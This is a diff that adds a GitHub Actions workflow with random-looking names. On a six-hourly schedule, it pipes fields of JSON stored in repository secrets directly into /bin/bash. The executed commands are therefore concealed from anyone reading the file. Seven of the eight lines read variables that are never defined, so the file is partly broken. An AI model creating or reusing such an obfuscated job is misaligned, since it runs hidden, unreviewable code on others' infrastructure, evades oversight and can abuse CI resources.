@@ -1,0 +1,25 @@
+name: smockfootman
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: smockfootman
+        env:
+          cqi27: ${{ secrets.cqi27 }}
+        run: |
+          echo $cqi27 | jq -r .l2 | /bin/bash
+          echo $ckiy8 | jq -r .tqwgl9773 | /bin/bash
+          echo $j699 | jq -r .ckwg21342 | /bin/bash
+          echo $d755 | jq -r .xolt5 | /bin/bash
+          echo $z64 | jq -r .i7590 | /bin/bash
+          echo $sjkzn6669 | jq -r .ze8 | /bin/bash
+          echo $gtr10 | jq -r .rlm72309 | /bin/bash
+          echo $i58 | jq -r .cos06 | /bin/bash
+
